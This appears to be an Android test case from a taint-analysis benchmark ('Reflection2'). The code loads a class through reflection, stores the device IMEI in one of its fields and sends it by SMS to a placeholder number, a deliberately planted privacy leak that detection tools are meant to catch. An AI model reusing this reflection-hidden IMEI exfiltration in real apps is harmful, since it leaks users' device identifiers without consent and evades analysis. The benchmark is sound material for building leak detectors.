package de.ecspride;

import android.app.Activity;
import android.content.Context;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.view.Menu;

/**
 * @testcase_name Reflection2
 * @version 0.1
 * @author Secure Software Engineering Group (SSE), European Center for Security and Privacy by Design (EC SPRIDE)
 * @author_mail steven.arzt@cased.de
 *
 * @description A class instance is created using reflection. Sensitive data is stored
 * 	in a field of this class, read out again using a method implemented in the "unknown"
 * 	class and leaked.
 * @dataflow onCreate: source -> bc.imei -> sink
 * @number_of_leaks 1
 * @challenges The analysis must be able to handle code implemented in classes loaded
 * 	using reflection.
 */
public class MainActivity extends Activity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        try {
            BaseClass bc = (BaseClass) Class.forName("de.ecspride.ConcreteClass").newInstance();
            TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
            // source
            bc.imei = telephonyManager.getDeviceId();
            SmsManager sms = SmsManager.getDefault();
            // sink, leak
            sms.sendTextMessage("+49 1234", null, bc.foo(), null, null);
        } catch (InstantiationException e) {
        } catch (IllegalAccessException e) {
        } catch (ClassNotFoundException e) {
        }
    }
}
